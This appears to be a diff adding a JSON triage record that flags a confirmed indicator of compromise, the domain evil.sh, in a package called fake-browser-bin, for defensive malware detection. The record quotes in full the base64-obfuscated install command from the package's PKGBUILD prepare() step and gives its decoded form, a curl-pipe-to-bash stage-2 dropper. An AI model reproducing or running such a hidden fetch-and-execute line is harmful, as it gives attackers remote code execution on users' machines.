@@ -1,0 +1,17 @@
+{
+  "branch": "triage/ioc-fake-browser-bin-cc9e2dec",
+  "event": "trustsight.confirmed-ioc",
+  "ioc_entries": [
+    {
+      "confidence": "high",
+      "provenance": "decoded payload in PKGBUILD prepare() (the `echo 'Y3VybCAtcyBodHRwOi8vZXZpbC5zaC9zdGFnZTIgfCBiYXNo' | base64 -d | bash` string decodes to curl against http://evil.sh/stage2)",
+      "type": "domain",
+      "value": "evil.sh"
+    }
+  ],
+  "package": "fake-browser-bin",
+  "priority": "default",
+  "rationale": "The runtime-decoded payloads show 'curl -s http://evil.sh/stage2 | bash', a classic stage-2 dropper that downloads and executes from an evil host; the only obfuscation is base64, which the runtime already stripped for us.",
+  "title": "Confirmed IOC: fake-browser-bin",
+  "version_transition": "1.0-1 to 1.0-2"
+}
